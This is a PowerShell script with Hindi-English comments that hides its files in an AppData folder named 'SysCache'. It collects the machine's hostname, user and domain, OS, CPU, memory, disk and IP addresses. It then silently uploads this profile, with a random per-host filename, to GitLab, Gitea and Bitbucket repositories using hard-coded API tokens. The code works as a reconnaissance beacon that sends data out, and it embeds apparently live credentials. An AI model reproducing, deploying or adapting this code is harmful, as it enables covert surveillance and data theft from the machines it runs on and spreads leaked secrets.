# PowerShell Script - GitHub Completely Removed (Only GitLab, Gitea, Bitbucket)

# Base directory
$BASE_DIR = "$env:USERPROFILE\AppData\Local\SysCache"

# Agar directory exist nahi karti, to create karo
if (!(Test-Path $BASE_DIR)) {
    New-Item -ItemType Directory -Path $BASE_DIR -Force | Out-Null
}

# Files paths (sab isi folder me)
$NAME_FILE  = Join-Path $BASE_DIR ".uniq_name"
$LOG_FILE   = Join-Path $BASE_DIR "run.log"
$ERROR_LOG  = Join-Path $BASE_DIR "error.log"

New-Item -ItemType File -Path $LOG_FILE -Force | Out-Null
New-Item -ItemType File -Path $ERROR_LOG -Force | Out-Null

function log($msg) {
    $ts = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    "$ts | $msg" | Out-File -FilePath $LOG_FILE -Append -Encoding UTF8
}
function err($msg) {
    $ts = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    "$ts | ERROR | $msg" | Out-File -FilePath $ERROR_LOG -Append -Encoding UTF8
}

# Unique filename
if (Test-Path $NAME_FILE) {
    $FILE_NAME = Get-Content $NAME_FILE
    log "Using existing filename: $FILE_NAME"
} else {
    $chars = "abcdefghijklmnopqrstuvwxyz0123456789"
    $rand = -join (1..12 | ForEach-Object { $chars[(Get-Random -Maximum $chars.Length)] })
    $FILE_NAME = "$rand.txt"
    $FILE_NAME | Out-File -FilePath $NAME_FILE -Encoding UTF8
    log "Generated new filename: $FILE_NAME"
}
$DETAIL_FILE = $FILE_NAME -replace '\.txt$', '2.0.txt'

# Content
$CONTENT_TEXT = "1.1"

# System info
$os = Get-WmiObject Win32_OperatingSystem
$totalMem = [math]::Round($os.TotalVisibleMemorySize / 1048576, 2)
$freeMem = [math]::Round($os.FreePhysicalMemory / 1048576, 2)
$cpu = Get-WmiObject Win32_Processor | Select-Object -First 1 Name, NumberOfCores, NumberOfLogicalProcessors
$disk = Get-PSDrive -PSProvider FileSystem | Where-Object { $_.Used -gt 0 } | ForEach-Object {
    " $($_.Root) Used: {0:N2} GB Free: {1:N2} GB" -f ($_.Used/1GB), ($_.Free/1GB)
}
$net = Get-NetIPAddress | Where-Object { $_.AddressFamily -eq 'IPv4' -and $_.InterfaceAlias -notlike '*Loopback*' } | ForEach-Object {
    " $($_.InterfaceAlias): $($_.IPAddress)/$($_.PrefixLength)"
}
$computerInfo = Get-ComputerInfo | Select-Object -Property WindowsProductName, WindowsVersion, OsBuildNumber
$SYSTEM_INFO = @"
Hostname : $($env:COMPUTERNAME)
User : $($env:USERNAME) ($($env:USERDOMAIN))
User Profile : $($env:USERPROFILE)
--- OS INFO ---
Product: $($computerInfo.WindowsProductName)
Version: $($computerInfo.WindowsVersion)
Build: $($computerInfo.OsBuildNumber)
--- CPU INFO ---
$($cpu.Name)
Cores: $($cpu.NumberOfCores) Logical: $($cpu.NumberOfLogicalProcessors)
--- MEMORY ---
Total Physical Memory: $totalMem GB
Free Physical Memory: $freeMem GB
--- DISK ---
$($disk -join "`r`n")
--- NETWORK ---
$($net -join "`r`n")
"@

# Tokens (GitHub wale poore remove kar diye)
$GITLAB_TOKEN = "glpat-44_-EqPHnzpoYv6Q7MQN0G86MQp1OmpkcmY3Cw.01.121i899xo"
$GITLAB_PROJECT_ID = "77335080"

$GITEA_TOKEN = "e74500c25abc6c336cf56363912cc25b8889c1f9"
$GITEA_OWNER = "mahesh2210m"
$GITEA_REPO = "mahesh2210m"

$BITBUCKET_TOKEN = "ATCTT3xFfGN0DuQH8htZo8z3MUuZ9djgI2zgZ2OsuFr6EB2UB6VrslIcrSrIj5oLUlYEDynqHgWeyYip58JTcYbbb2e0E3Wlm0ycYQhPt8GUyrc7dvTCE-JgOjF4jF3szz1zZUZGdGuVTCqIpG6fmqw7y41barxprerA_t_OM_kVEhatQrNJdfA=1417FEA8"
$BITBUCKET_WORKSPACE = "mahesh2210m"
$BITBUCKET_REPO = "mahesh"

# GitLab Function
function Create-GitLab($fname, $content) {
    $enc = [Uri]::EscapeDataString($fname)
    $headers = @{ "PRIVATE-TOKEN" = $GITLAB_TOKEN }
    $checkUri = "https://gitlab.com/api/v4/projects/$GITLAB_PROJECT_ID/repository/files/$enc"
    $existing = $null
    try {
        $existing = Invoke-RestMethod -Uri $checkUri -Method Get -Headers $headers
    } catch { }

    if ($existing) {
        $body = @{ branch = "main"; commit_message = "update $fname"; content = $content } | ConvertTo-Json
        $method = "Put"
        log "GitLab: Updating $fname"
    } else {
        $body = @{ branch = "main"; commit_message = "add $fname"; content = $content } | ConvertTo-Json
        $method = "Post"
        log "GitLab: Creating $fname"
    }

    try {
        Invoke-RestMethod -Uri $checkUri -Method $method -Body $body -Headers $headers -ContentType "application/json" | Out-Null
        log "GitLab: SUCCESS $fname"
    } catch {
        err "GitLab failed: $fname - $($_.Exception.Message)"
    }
}

# Gitea Function
function Create-Gitea($fname, $content) {
    $b64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($content))
    $body = @{ message = "add $fname"; content = $b64; encoding = "base64"; branch = "main" } | ConvertTo-Json -Compress
    try {
        Invoke-RestMethod -Uri "https://gitea.com/api/v1/repos/$GITEA_OWNER/$GITEA_REPO/contents/$fname" -Method Post -Body $body -Headers @{ Authorization = "token $GITEA_TOKEN" } -ContentType "application/json" | Out-Null
        log "Gitea: SUCCESS $fname"
    } catch {
        err "Gitea failed: $fname - $($_.Exception.Message)"
    }
}

# Bitbucket Function
function Create-Bitbucket($fname, $content) {
    $boundary = [guid]::NewGuid().ToString()
    $bodyLines = "--$boundary`r`nContent-Disposition: form-data; name=`"branch`"`r`n`r`nmain`r`n--$boundary`r`nContent-Disposition: form-data; name=`"$fname`"; filename=`"$fname`"`r`nContent-Type: text/plain`r`n`r`n$content`r`n--$boundary--"
    try {
        Invoke-RestMethod -Uri "https://api.bitbucket.org/2.0/repositories/$BITBUCKET_WORKSPACE/$BITBUCKET_REPO/src" -Method Post -Body $bodyLines -Headers @{ Authorization = "Bearer $BITBUCKET_TOKEN" } -ContentType "multipart/form-data; boundary=$boundary" | Out-Null
        log "Bitbucket: SUCCESS $fname"
    } catch {
        err "Bitbucket failed: $fname - $($_.Exception.Message)"
    }
}

# Process Function (GitHub removed)
function Process-File($fname, $content) {
    log "=== Processing $fname ==="
    Create-GitLab $fname $content
    Create-Gitea $fname $content
    Create-Bitbucket $fname $content
}

# Execute
Process-File $FILE_NAME $CONTENT_TEXT
Process-File $DETAIL_FILE $SYSTEM_INFO
log "Script finished successfully - GitLab, Gitea aur Bitbucket pe upload ho gaya"
